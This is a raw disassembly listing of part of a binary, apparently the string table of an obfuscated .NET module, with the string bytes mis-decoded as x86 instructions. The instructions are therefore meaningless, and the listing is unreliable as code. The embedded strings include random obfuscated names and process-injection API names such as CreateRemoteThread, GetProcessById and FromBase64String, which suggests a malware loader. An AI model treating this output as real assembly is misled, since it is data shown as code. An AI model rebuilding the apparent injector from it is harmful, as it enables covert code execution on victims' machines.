10002c0a:	71 72                	jno    0x10002c7e
10002c0c:	67 42                	addr16 inc %edx
10002c0e:	76 66                	jbe    0x10002c76
10002c10:	63 70 6e             	arpl   %esi,0x6e(%eax)
10002c13:	56                   	push   %esi
10002c14:	55                   	push   %ebp
10002c15:	4a                   	dec    %edx
10002c16:	00 5a 58             	add    %bl,0x58(%edx)
10002c19:	72 6d                	jb     0x10002c88
10002c1b:	59                   	pop    %ecx
10002c1c:	59                   	pop    %ecx
10002c1d:	57                   	push   %edi
10002c1e:	6d                   	insl   (%dx),%es:(%edi)
10002c1f:	71 55                	jno    0x10002c76
10002c21:	48                   	dec    %eax
10002c22:	6a 78                	push   $0x78
10002c24:	56                   	push   %esi
10002c25:	43                   	inc    %ebx
10002c26:	71 4d                	jno    0x10002c75
10002c28:	4b                   	dec    %ebx
10002c29:	00 51 56             	add    %dl,0x56(%ecx)
10002c2c:	41                   	inc    %ecx
10002c2d:	64 4b                	fs dec %ebx
10002c2f:	62 53 49             	bound  %edx,0x49(%ebx)
10002c32:	42                   	inc    %edx
10002c33:	43                   	inc    %ebx
10002c34:	4e                   	dec    %esi
10002c35:	42                   	inc    %edx
10002c36:	34 61                	xor    $0x61,%al
10002c38:	50                   	push   %eax
10002c39:	69 38 61 67 52 6a    	imul   $0x6a526761,(%eax),%edi
10002c3f:	6e                   	outsb  %ds:(%esi),(%dx)
10002c40:	6b 4b 00 47          	imul   $0x47,0x0(%ebx),%ecx
10002c44:	48                   	dec    %eax
10002c45:	62 56 46             	bound  %edx,0x46(%esi)
10002c48:	52                   	push   %edx
10002c49:	4c                   	dec    %esp
10002c4a:	72 4c                	jb     0x10002c98
10002c4c:	6a 64                	push   $0x64
10002c4e:	6e                   	outsb  %ds:(%esi),(%dx)
10002c4f:	59                   	pop    %ecx
10002c50:	53                   	push   %ebx
10002c51:	4d                   	dec    %ebp
10002c52:	00 50 52             	add    %dl,0x52(%eax)
10002c55:	4f                   	dec    %edi
10002c56:	43                   	inc    %ebx
10002c57:	45                   	inc    %ebp
10002c58:	53                   	push   %ebx
10002c59:	53                   	push   %ebx
10002c5a:	5f                   	pop    %edi
10002c5b:	49                   	dec    %ecx
10002c5c:	4e                   	dec    %esi
10002c5d:	46                   	inc    %esi
10002c5e:	4f                   	dec    %edi
10002c5f:	52                   	push   %edx
10002c60:	4d                   	dec    %ebp
10002c61:	41                   	inc    %ecx
10002c62:	54                   	push   %esp
10002c63:	49                   	dec    %ecx
10002c64:	4f                   	dec    %edi
10002c65:	4e                   	dec    %esi
10002c66:	00 53 54             	add    %dl,0x54(%ebx)
10002c69:	41                   	inc    %ecx
10002c6a:	52                   	push   %edx
10002c6b:	54                   	push   %esp
10002c6c:	55                   	push   %ebp
10002c6d:	50                   	push   %eax
10002c6e:	49                   	dec    %ecx
10002c6f:	4e                   	dec    %esi
10002c70:	46                   	inc    %esi
10002c71:	4f                   	dec    %edi
10002c72:	00 53 79             	add    %dl,0x79(%ebx)
10002c75:	73 74                	jae    0x10002ceb
10002c77:	65 6d                	gs insl (%dx),%es:(%edi)
10002c79:	2e 49                	cs dec %ecx
10002c7b:	4f                   	dec    %edi
10002c7c:	00 56 6d             	add    %dl,0x6d(%esi)
10002c7f:	55                   	push   %ebp
10002c80:	66 68 48 65          	pushw  $0x6548
10002c84:	42                   	inc    %edx
10002c85:	52                   	push   %edx
10002c86:	41                   	inc    %ecx
10002c87:	30 39                	xor    %bh,(%ecx)
10002c89:	62 54 73 43          	bound  %edx,0x43(%ebx,%esi,2)
10002c8d:	4b                   	dec    %ebx
10002c8e:	76 49                	jbe    0x10002cd9
10002c90:	68 72 76 4c 54       	push   $0x544c7672
10002c95:	00 47 6c             	add    %al,0x6c(%edi)
10002c98:	6e                   	outsb  %ds:(%esi),(%dx)
10002c99:	47                   	inc    %edi
10002c9a:	6c                   	insb   (%dx),%es:(%edi)
10002c9b:	6e                   	outsb  %ds:(%esi),(%dx)
10002c9c:	76 7a                	jbe    0x10002d18
10002c9e:	4a                   	dec    %edx
10002c9f:	45                   	inc    %ebp
10002ca0:	4d                   	dec    %ebp
10002ca1:	62 42 69             	bound  %eax,0x69(%edx)
10002ca4:	62 7a 33             	bound  %edi,0x33(%edx)
10002ca7:	74 69                	je     0x10002d12
10002ca9:	4e                   	dec    %esi
10002caa:	58                   	pop    %eax
10002cab:	7a 55                	jp     0x10002d02
10002cad:	00 49 5a             	add    %cl,0x5a(%ecx)
10002cb0:	75 42                	jne    0x10002cf4
10002cb2:	63 43 48             	arpl   %eax,0x48(%ebx)
10002cb5:	6e                   	outsb  %ds:(%esi),(%dx)
10002cb6:	66 71 78             	data16 jno 0x10002d31
10002cb9:	73 7a                	jae    0x10002d35
10002cbb:	69 71 61 36 47 51 58 	imul   $0x58514736,0x61(%ecx),%esi
10002cc2:	00 4b 49             	add    %cl,0x49(%ebx)
10002cc5:	65 46                	gs inc %esi
10002cc7:	6f                   	outsl  %ds:(%esi),(%dx)
10002cc8:	50                   	push   %eax
10002cc9:	6b 72 76 4a          	imul   $0x4a,0x76(%edx),%esi
10002ccd:	42                   	inc    %edx
10002cce:	70 49                	jo     0x10002d19
10002cd0:	62 49 70             	bound  %ecx,0x70(%ecx)
10002cd3:	34 78                	xor    $0x78,%al
10002cd5:	53                   	push   %ebx
10002cd6:	6f                   	outsl  %ds:(%esi),(%dx)
10002cd7:	58                   	pop    %eax
10002cd8:	6e                   	outsb  %ds:(%esi),(%dx)
10002cd9:	33 54 58 00          	xor    0x0(%eax,%ebx,2),%edx
10002cdd:	64 77 58             	fs ja  0x10002d38
10002ce0:	00 58 74             	add    %bl,0x74(%eax)
10002ce3:	6b 6d 76 48          	imul   $0x48,0x76(%ebp),%ebp
10002ce7:	62 6a 63             	bound  %ebp,0x63(%edx)
10002cea:	30 62 51             	xor    %ah,0x51(%edx)
10002ced:	4d                   	dec    %ebp
10002cee:	4a                   	dec    %edx
10002cef:	6f                   	outsl  %ds:(%esi),(%dx)
10002cf0:	48                   	dec    %eax
10002cf1:	31 55 62             	xor    %edx,0x62(%ebp)
10002cf4:	55                   	push   %ebp
10002cf5:	31 59 00             	xor    %ebx,0x0(%ecx)
10002cf8:	4b                   	dec    %ebx
10002cf9:	64 6a 57             	fs push $0x57
10002cfc:	53                   	push   %ebx
10002cfd:	47                   	inc    %edi
10002cfe:	65 38 69 65          	cmp    %ch,%gs:0x65(%ecx)
10002d02:	6c                   	insb   (%dx),%es:(%edi)
10002d03:	41                   	inc    %ecx
10002d04:	56                   	push   %esi
10002d05:	43                   	inc    %ebx
10002d06:	76 4f                	jbe    0x10002d57
10002d08:	35 59 00 50 79       	xor    $0x79500059,%eax
10002d0d:	4a                   	dec    %edx
10002d0e:	52                   	push   %edx
10002d0f:	52                   	push   %edx
10002d10:	68 65 6b 57 6d       	push   $0x6d576b65
10002d15:	77 64                	ja     0x10002d7b
10002d17:	65 46                	gs inc %esi
10002d19:	63 4b 57             	arpl   %ecx,0x57(%ebx)
10002d1c:	6a 59                	push   $0x59
10002d1e:	00 64 77 59          	add    %ah,0x59(%edi,%esi,2)
10002d22:	00 45 4e             	add    %al,0x4e(%ebp)
10002d25:	63 5a 78             	arpl   %ebx,0x78(%edx)
10002d28:	73 43                	jae    0x10002d6d
10002d2a:	31 34 6e             	xor    %esi,(%esi,%ebp,2)
10002d2d:	32 52 66             	xor    0x66(%edx),%dl
10002d30:	69 59 43 61 00 4c 79 	imul   $0x794c0061,0x43(%ecx),%ebx
10002d37:	67 70 72             	addr16 jo 0x10002dac
10002d3a:	58                   	pop    %eax
10002d3b:	66 34 6a             	data16 xor $0x6a,%al
10002d3e:	62 41 72             	bound  %eax,0x72(%ecx)
10002d41:	74 61                	je     0x10002da4
10002d43:	00 59 49             	add    %bl,0x49(%ecx)
10002d46:	59                   	pop    %ecx
10002d47:	74 66                	je     0x10002daf
10002d49:	54                   	push   %esp
10002d4a:	4e                   	dec    %esi
10002d4b:	43                   	inc    %ebx
10002d4c:	4c                   	dec    %esp
10002d4d:	37                   	aaa
10002d4e:	4d                   	dec    %ebp
10002d4f:	32 49 58             	xor    0x58(%ecx),%cl
10002d52:	62 00                	bound  %eax,(%eax)
10002d54:	63 62 00             	arpl   %esp,0x0(%edx)
10002d57:	6d                   	insl   (%dx),%es:(%edi)
10002d58:	73 63                	jae    0x10002dbd
10002d5a:	6f                   	outsl  %ds:(%esi),(%dx)
10002d5b:	72 6c                	jb     0x10002dc9
10002d5d:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
10002d64:	65 6d                	gs insl (%dx),%es:(%edi)
10002d66:	2e 43                	cs inc %ebx
10002d68:	6f                   	outsl  %ds:(%esi),(%dx)
10002d69:	6c                   	insb   (%dx),%es:(%edi)
10002d6a:	6c                   	insb   (%dx),%es:(%edi)
10002d6b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
10002d70:	6e                   	outsb  %ds:(%esi),(%dx)
10002d71:	73 2e                	jae    0x10002da1
10002d73:	47                   	inc    %edi
10002d74:	65 6e                	outsb  %gs:(%esi),(%dx)
10002d76:	65 72 69             	gs jb  0x10002de2
10002d79:	63 00                	arpl   %eax,(%eax)
10002d7b:	47                   	inc    %edi
10002d7c:	65 74 50             	gs je  0x10002dcf
10002d7f:	72 6f                	jb     0x10002df0
10002d81:	63 65 73             	arpl   %esp,0x73(%ebp)
10002d84:	73 42                	jae    0x10002dc8
10002d86:	79 49                	jns    0x10002dd1
10002d88:	64 00 56 6d          	add    %dl,%fs:0x6d(%esi)
10002d8c:	68 6a 71 67 74       	push   $0x7467716a
10002d91:	4a                   	dec    %edx
10002d92:	31 52 70             	xor    %edx,0x70(%edx)
10002d95:	75 34                	jne    0x10002dcb
10002d97:	48                   	dec    %eax
10002d98:	54                   	push   %esp
10002d99:	69 4b 48 55 73 59 61 	imul   $0x61597355,0x48(%ebx),%ecx
10002da0:	64 00 47 65          	add    %al,%fs:0x65(%edi)
10002da4:	74 45                	je     0x10002deb
10002da6:	78 69                	js     0x10002e11
10002da8:	74 43                	je     0x10002ded
10002daa:	6f                   	outsl  %ds:(%esi),(%dx)
10002dab:	64 65 54             	fs gs push %esp
10002dae:	68 72 65 61 64       	push   $0x64616572
10002db3:	00 43 72             	add    %al,0x72(%ebx)
10002db6:	65 61                	gs popa
10002db8:	74 65                	je     0x10002e1f
10002dba:	52                   	push   %edx
10002dbb:	65 6d                	gs insl (%dx),%es:(%edi)
10002dbd:	6f                   	outsl  %ds:(%esi),(%dx)
10002dbe:	74 65                	je     0x10002e25
10002dc0:	54                   	push   %esp
10002dc1:	68 72 65 61 64       	push   $0x64616572
10002dc6:	00 41 64             	add    %al,0x64(%ecx)
10002dc9:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
10002dcd:	74 5f                	je     0x10002e2e
10002dcf:	48                   	dec    %eax
10002dd0:	61                   	popa
10002dd1:	73 45                	jae    0x10002e18
10002dd3:	78 69                	js     0x10002e3e
10002dd5:	74 65                	je     0x10002e3c
10002dd7:	64 00 58 73          	add    %bl,%fs:0x73(%eax)
10002ddb:	55                   	push   %ebp
10002ddc:	61                   	popa
10002ddd:	44                   	inc    %esp
10002dde:	42                   	inc    %edx
10002ddf:	33 59 33             	xor    0x33(%ecx),%ebx
10002de2:	49                   	dec    %ecx
10002de3:	68 5a 4e 4b 68       	push   $0x684b4e5a
10002de8:	6f                   	outsl  %ds:(%esi),(%dx)
10002de9:	4b                   	dec    %ebx
10002dea:	51                   	push   %ecx
10002deb:	52                   	push   %edx
10002dec:	6a 64                	push   $0x64
10002dee:	00 52 65             	add    %dl,0x65(%edx)
10002df1:	70 6c                	jo     0x10002e5f
10002df3:	61                   	popa
10002df4:	63 65 00             	arpl   %esp,0x0(%ebp)
10002df7:	45                   	inc    %ebp
10002df8:	6e                   	outsb  %ds:(%esi),(%dx)
10002df9:	75 6d                	jne    0x10002e68
10002dfb:	65 72 61             	gs jb  0x10002e5f
10002dfe:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
10002e02:	43                   	inc    %ebx
10002e03:	6c                   	insb   (%dx),%es:(%edi)
10002e04:	6f                   	outsl  %ds:(%esi),(%dx)
10002e05:	73 65                	jae    0x10002e6c
10002e07:	48                   	dec    %eax
10002e08:	61                   	popa
10002e09:	6e                   	outsb  %ds:(%esi),(%dx)
10002e0a:	64 6c                	fs insb (%dx),%es:(%edi)
10002e0c:	65 00 66 69          	add    %ah,%gs:0x69(%esi)
10002e10:	6c                   	insb   (%dx),%es:(%edi)
10002e11:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
10002e15:	6c                   	insb   (%dx),%es:(%edi)
10002e16:	75 65                	jne    0x10002e7d
10002e18:	54                   	push   %esp
10002e19:	79 70                	jns    0x10002e8b
10002e1b:	65 00 57 68          	add    %dl,%gs:0x68(%edi)
10002e1f:	65 72 65             	gs jb  0x10002e87
10002e22:	00 53 79             	add    %dl,0x79(%ebx)
10002e25:	73 74                	jae    0x10002e9b
10002e27:	65 6d                	gs insl (%dx),%es:(%edi)
10002e29:	2e 43                	cs inc %ebx
10002e2b:	6f                   	outsl  %ds:(%esi),(%dx)
10002e2c:	72 65                	jb     0x10002e93
10002e2e:	00 43 6f             	add    %al,0x6f(%ebx)
10002e31:	6d                   	insl   (%dx),%es:(%edi)
10002e32:	70 69                	jo     0x10002e9d
10002e34:	6c                   	insb   (%dx),%es:(%edi)
10002e35:	65 72 47             	gs jb  0x10002e7f
10002e38:	65 6e                	outsb  %gs:(%esi),(%dx)
10002e3a:	65 72 61             	gs jb  0x10002e9e
10002e3d:	74 65                	je     0x10002ea4
10002e3f:	64 41                	fs inc %ecx
10002e41:	74 74                	je     0x10002eb7
10002e43:	72 69                	jb     0x10002eae
10002e45:	62 75 74             	bound  %esi,0x74(%ebp)
10002e48:	65 00 47 75          	add    %al,%gs:0x75(%edi)
10002e4c:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
10002e53:	62 
10002e54:	75 74                	jne    0x10002eca
10002e56:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
10002e5b:	75 67                	jne    0x10002ec4
10002e5d:	67 61                	addr16 popa
10002e5f:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
10002e63:	74 74                	je     0x10002ed9
10002e65:	72 69                	jb     0x10002ed0
10002e67:	62 75 74             	bound  %esi,0x74(%ebp)
10002e6a:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10002e6e:	6d                   	insl   (%dx),%es:(%edi)
10002e6f:	56                   	push   %esi
10002e70:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
10002e77:	74 74                	je     0x10002eed
10002e79:	72 69                	jb     0x10002ee4
10002e7b:	62 75 74             	bound  %esi,0x74(%ebp)
10002e7e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002e82:	73 65                	jae    0x10002ee9
10002e84:	6d                   	insl   (%dx),%es:(%edi)
10002e85:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002e89:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
10002e90:	72 
10002e91:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
10002e98:	73 73                	jae    0x10002f0d
10002e9a:	65 6d                	gs insl (%dx),%es:(%edi)
10002e9c:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002ea0:	72 61                	jb     0x10002f03
10002ea2:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
10002ea5:	61                   	popa
10002ea6:	72 6b                	jb     0x10002f13
10002ea8:	41                   	inc    %ecx
10002ea9:	74 74                	je     0x10002f1f
10002eab:	72 69                	jb     0x10002f16
10002ead:	62 75 74             	bound  %esi,0x74(%ebp)
10002eb0:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
10002eb5:	67 65 74 46          	addr16 gs je 0x10002eff
10002eb9:	72 61                	jb     0x10002f1c
10002ebb:	6d                   	insl   (%dx),%es:(%edi)
10002ebc:	65 77 6f             	gs ja  0x10002f2e
10002ebf:	72 6b                	jb     0x10002f2c
10002ec1:	41                   	inc    %ecx
10002ec2:	74 74                	je     0x10002f38
10002ec4:	72 69                	jb     0x10002f2f
10002ec6:	62 75 74             	bound  %esi,0x74(%ebp)
10002ec9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002ecd:	73 65                	jae    0x10002f34
10002ecf:	6d                   	insl   (%dx),%es:(%edi)
10002ed0:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
10002ed4:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
10002edb:	69 
10002edc:	6f                   	outsl  %ds:(%esi),(%dx)
10002edd:	6e                   	outsb  %ds:(%esi),(%dx)
10002ede:	41                   	inc    %ecx
10002edf:	74 74                	je     0x10002f55
10002ee1:	72 69                	jb     0x10002f4c
10002ee3:	62 75 74             	bound  %esi,0x74(%ebp)
10002ee6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002eea:	73 65                	jae    0x10002f51
10002eec:	6d                   	insl   (%dx),%es:(%edi)
10002eed:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002ef1:	6f                   	outsl  %ds:(%esi),(%dx)
10002ef2:	6e                   	outsb  %ds:(%esi),(%dx)
10002ef3:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
10002ef9:	74 69                	je     0x10002f64
10002efb:	6f                   	outsl  %ds:(%esi),(%dx)
10002efc:	6e                   	outsb  %ds:(%esi),(%dx)
10002efd:	41                   	inc    %ecx
10002efe:	74 74                	je     0x10002f74
10002f00:	72 69                	jb     0x10002f6b
10002f02:	62 75 74             	bound  %esi,0x74(%ebp)
10002f05:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f09:	73 65                	jae    0x10002f70
10002f0b:	6d                   	insl   (%dx),%es:(%edi)
10002f0c:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
10002f10:	65 73 63             	gs jae 0x10002f76
10002f13:	72 69                	jb     0x10002f7e
10002f15:	70 74                	jo     0x10002f8b
10002f17:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
10002f1e:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
10002f25:	6f                   	outsl  %ds:(%esi),(%dx)
10002f26:	6d                   	insl   (%dx),%es:(%edi)
10002f27:	70 69                	jo     0x10002f92
10002f29:	6c                   	insb   (%dx),%es:(%edi)
10002f2a:	61                   	popa
10002f2b:	74 69                	je     0x10002f96
10002f2d:	6f                   	outsl  %ds:(%esi),(%dx)
10002f2e:	6e                   	outsb  %ds:(%esi),(%dx)
10002f2f:	52                   	push   %edx
10002f30:	65 6c                	gs insb (%dx),%es:(%edi)
10002f32:	61                   	popa
10002f33:	78 61                	js     0x10002f96
10002f35:	74 69                	je     0x10002fa0
10002f37:	6f                   	outsl  %ds:(%esi),(%dx)
10002f38:	6e                   	outsb  %ds:(%esi),(%dx)
10002f39:	73 41                	jae    0x10002f7c
10002f3b:	74 74                	je     0x10002fb1
10002f3d:	72 69                	jb     0x10002fa8
10002f3f:	62 75 74             	bound  %esi,0x74(%ebp)
10002f42:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f46:	73 65                	jae    0x10002fad
10002f48:	6d                   	insl   (%dx),%es:(%edi)
10002f49:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
10002f4d:	72 6f                	jb     0x10002fbe
10002f4f:	64 75 63             	fs jne 0x10002fb5
10002f52:	74 41                	je     0x10002f95
10002f54:	74 74                	je     0x10002fca
10002f56:	72 69                	jb     0x10002fc1
10002f58:	62 75 74             	bound  %esi,0x74(%ebp)
10002f5b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f5f:	73 65                	jae    0x10002fc6
10002f61:	6d                   	insl   (%dx),%es:(%edi)
10002f62:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002f66:	6f                   	outsl  %ds:(%esi),(%dx)
10002f67:	70 79                	jo     0x10002fe2
10002f69:	72 69                	jb     0x10002fd4
10002f6b:	67 68 74 41 74 74    	addr16 push $0x74744174
10002f71:	72 69                	jb     0x10002fdc
10002f73:	62 75 74             	bound  %esi,0x74(%ebp)
10002f76:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f7a:	73 65                	jae    0x10002fe1
10002f7c:	6d                   	insl   (%dx),%es:(%edi)
10002f7d:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002f81:	6f                   	outsl  %ds:(%esi),(%dx)
10002f82:	6d                   	insl   (%dx),%es:(%edi)
10002f83:	70 61                	jo     0x10002fe6
10002f85:	6e                   	outsb  %ds:(%esi),(%dx)
10002f86:	79 41                	jns    0x10002fc9
10002f88:	74 74                	je     0x10002ffe
10002f8a:	72 69                	jb     0x10002ff5
10002f8c:	62 75 74             	bound  %esi,0x74(%ebp)
10002f8f:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
10002f93:	6e                   	outsb  %ds:(%esi),(%dx)
10002f94:	74 69                	je     0x10002fff
10002f96:	6d                   	insl   (%dx),%es:(%edi)
10002f97:	65 43                	gs inc %ebx
10002f99:	6f                   	outsl  %ds:(%esi),(%dx)
10002f9a:	6d                   	insl   (%dx),%es:(%edi)
10002f9b:	70 61                	jo     0x10002ffe
10002f9d:	74 69                	je     0x10003008
10002f9f:	62 69 6c             	bound  %ebp,0x6c(%ecx)
10002fa2:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
10002fa9:	69 
10002faa:	62 75 74             	bound  %esi,0x74(%ebp)
10002fad:	65 00 53 69          	add    %dl,%gs:0x69(%ebx)
10002fb1:	7a 65                	jp     0x10003018
10002fb3:	4f                   	dec    %edi
10002fb4:	66 00 53 79          	data16 add %dl,0x79(%ebx)
10002fb8:	73 74                	jae    0x1000302e
10002fba:	65 6d                	gs insl (%dx),%es:(%edi)
10002fbc:	2e 54                	cs push %esp
10002fbe:	68 72 65 61 64       	push   $0x64616572
10002fc3:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
10002fca:	6f                   	outsl  %ds:(%esi),(%dx)
10002fcb:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
10002fd2:	73 
10002fd3:	74 65                	je     0x1000303a
10002fd5:	6d                   	insl   (%dx),%es:(%edi)
10002fd6:	2e 52                	cs push %edx
10002fd8:	75 6e                	jne    0x10003048
10002fda:	74 69                	je     0x10003045
10002fdc:	6d                   	insl   (%dx),%es:(%edi)
10002fdd:	65 2e 56             	gs cs push %esi
10002fe0:	65 72 73             	gs jb  0x10003056
10002fe3:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
10002fea:	46                   	inc    %esi
10002feb:	72 6f                	jb     0x1000305c
10002fed:	6d                   	insl   (%dx),%es:(%edi)
10002fee:	42                   	inc    %edx
10002fef:	61                   	popa
10002ff0:	73 65                	jae    0x10003057
10002ff2:	36 34 53             	ss xor $0x53,%al
10002ff5:	74 72                	je     0x10003069
10002ff7:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
10002ffe:	53                   	push   %ebx
10002fff:	74 72                	je     0x10003073
10003001:	69 6e 67 00 54 64 74 	imul   $0x74645400,0x67(%esi),%ebp
10003008:	56                   	push   %esi
10003009:	41                   	inc    %ecx
1000300a:	74 66                	je     0x10003072
1000300c:	37                   	aaa
1000300d:	70 4c                	jo     0x1000305b
1000300f:	71 66                	jno    0x10003077
10003011:	4b                   	dec    %ebx
10003012:	50                   	push   %eax
10003013:	68 00 50 61 74       	push   $0x74615000
10003018:	68 00 50 45 55       	push   $0x55455000
1000301d:	5a                   	pop    %edx
1000301e:	78 55                	js     0x10003075
10003020:	72 78                	jb     0x1000309a
10003022:	57                   	push   %edi
10003023:	6e                   	outsb  %ds:(%esi),(%dx)
10003024:	76 61                	jbe    0x10003087
10003026:	35 35 34 39 63       	xor    $0x63393435,%eax
1000302b:	69 5a 75 6c 6f 79 57 	imul   $0x57796f6c,0x75(%edx),%ebx
10003032:	6a 00                	push   $0x0
10003034:	4d                   	dec    %ebp
10003035:	61                   	popa
10003036:	72 73                	jb     0x100030ab
10003038:	68 61 6c 00 6b       	push   $0x6b006c61
1000303d:	65 72 6e             	gs jb  0x100030ae
10003040:	65 6c                	gs insb (%dx),%es:(%edi)
10003042:	33 32                	xor    (%edx),%esi
10003044:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
10003047:	6c                   	insb   (%dx),%es:(%edi)
10003048:	00 4c 66 74          	add    %cl,0x74(%esi,%eiz,2)
1000304c:	6d                   	insl   (%dx),%es:(%edi)
1000304d:	6e                   	outsb  %ds:(%esi),(%dx)
1000304e:	68 56 37 6e 6a       	push   $0x6a6e3756
10003053:	53                   	push   %ebx
10003054:	65 78 43             	gs js  0x1000309a
10003057:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
1000305a:	6c                   	insb   (%dx),%es:(%edi)
1000305b:	00 4b 69             	add    %cl,0x69(%ebx)
1000305e:	6c                   	insb   (%dx),%es:(%edi)
1000305f:	6c                   	insb   (%dx),%es:(%edi)
10003060:	00 53 79             	add    %dl,0x79(%ebx)
10003063:	73 74                	jae    0x100030d9
10003065:	65 6d                	gs insl (%dx),%es:(%edi)
10003067:	00 52 61             	add    %dl,0x61(%edx)
1000306a:	6e                   	outsb  %ds:(%esi),(%dx)
1000306b:	64 6f                	outsl  %fs:(%esi),(%dx)
1000306d:	6d                   	insl   (%dx),%es:(%edi)
1000306e:	00 4a 46             	add    %cl,0x46(%edx)
10003071:	4e                   	dec    %esi
10003072:	51                   	push   %ecx
10003073:	61                   	popa
10003074:	58                   	pop    %eax
10003075:	71 6d                	jno    0x100030e4
10003077:	77 51                	ja     0x100030ca
10003079:	59                   	pop    %ecx
1000307a:	53                   	push   %ebx
1000307b:	30 66 6e             	xor    %ah,0x6e(%esi)
1000307e:	64 6a 71             	fs push $0x71
10003081:	41                   	inc    %ecx
10003082:	49                   	dec    %ecx
10003083:	65 76 6d             	gs jbe 0x100030f3
10003086:	00 47 65             	add    %al,0x65(%edi)
10003089:	74 46                	je     0x100030d1
1000308b:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
10003092:	57 
10003093:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
1000309a:	78 
1000309b:	74 65                	je     0x10003102
1000309d:	6e                   	outsb  %ds:(%esi),(%dx)
1000309e:	73 69                	jae    0x10003109
100030a0:	6f                   	outsl  %ds:(%esi),(%dx)
100030a1:	6e                   	outsb  %ds:(%esi),(%dx)
100030a2:	00 53 79             	add    %dl,0x79(%ebx)
100030a5:	73 74                	jae    0x1000311b
100030a7:	65 6d                	gs insl (%dx),%es:(%edi)
100030a9:	2e 52                	cs push %edx
100030ab:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
100030ae:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
100030b3:	6e                   	outsb  %ds:(%esi),(%dx)
100030b4:	00 53 65             	add    %dl,0x65(%ebx)
100030b7:	61                   	popa
100030b8:	72 63                	jb     0x1000311d
100030ba:	68 4f 70 74 69       	push   $0x6974704f
100030bf:	6f                   	outsl  %ds:(%esi),(%dx)
100030c0:	6e                   	outsb  %ds:(%esi),(%dx)
100030c1:	00 45 78             	add    %al,0x78(%ebp)
100030c4:	63 65 70             	arpl   %esp,0x70(%ebp)
100030c7:	74 69                	je     0x10003132
100030c9:	6f                   	outsl  %ds:(%esi),(%dx)
100030ca:	6e                   	outsb  %ds:(%esi),(%dx)
100030cb:	00 54 73 74          	add    %dl,0x74(%ebx,%esi,2)
100030cf:	6f                   	outsl  %ds:(%esi),(%dx)
100030d0:	6d                   	insl   (%dx),%es:(%edi)
100030d1:	70 66                	jo     0x10003139
100030d3:	35 4d 47 35 41       	xor    $0x4135474d,%eax
100030d8:	73 32                	jae    0x1000310c
100030da:	38 6c 75 59          	cmp    %ch,0x59(%ebp,%esi,2)
100030de:	52                   	push   %edx
100030df:	44                   	inc    %esp
100030e0:	47                   	inc    %edi
100030e1:	59                   	pop    %ecx
100030e2:	62 32                	bound  %esi,(%edx)
100030e4:	6f                   	outsl  %ds:(%esi),(%dx)
100030e5:	00 41 4c             	add    %al,0x4c(%ecx)
100030e8:	63 4f 63             	arpl   %ecx,0x63(%edi)
100030eb:	6f                   	outsl  %ds:(%esi),(%dx)
100030ec:	6e                   	outsb  %ds:(%esi),(%dx)
100030ed:	6e                   	outsb  %ds:(%esi),(%dx)
100030ee:	49                   	dec    %ecx
100030ef:	72 68                	jb     0x10003159
100030f1:	64 47                	fs inc %edi
100030f3:	34 31                	xor    $0x31,%al
100030f5:	52                   	push   %edx
100030f6:	69 49 72 38 6b 42 32 	imul   $0x32426b38,0x72(%ecx),%ecx
100030fd:	4f                   	dec    %edi
100030fe:	6f                   	outsl  %ds:(%esi),(%dx)
100030ff:	00 46 57             	add    %al,0x57(%esi)
10003102:	4d                   	dec    %ebp
10003103:	64 48                	fs dec %eax
10003105:	5a                   	pop    %edx
10003106:	4b                   	dec    %ebx
10003107:	6c                   	insb   (%dx),%es:(%edi)
10003108:	64 72 50             	fs jb  0x1000315b
1000310b:	41                   	inc    %ecx
1000310c:	7a 30                	jp     0x1000313e
1000310e:	58                   	pop    %eax
1000310f:	33 53 6f             	xor    0x6f(%ebx),%edx
